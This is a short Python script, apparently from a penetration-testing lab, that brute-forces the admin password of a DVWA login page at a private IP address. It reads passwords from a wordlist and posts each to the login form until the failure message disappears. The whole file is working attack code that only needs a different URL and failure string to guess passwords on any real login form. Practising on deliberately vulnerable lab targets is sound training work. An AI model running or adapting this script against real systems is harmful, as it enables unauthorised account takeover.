import  requests

target_url ="http://192.168.187.134/dvwa/login.php"


with open ("/home/kali/Desktop/common.txt" , "r") as file :
    for line in file :
        password = line.strip()
        data_dict = {"username": "admin", "password": password, "Login": "submit"}
        response = requests.post(target_url, data=data_dict)

        if "Login failed" not in response.text:
            print("Password Okay --- > "  + password)
            break
        else:
            print("error: " +password)
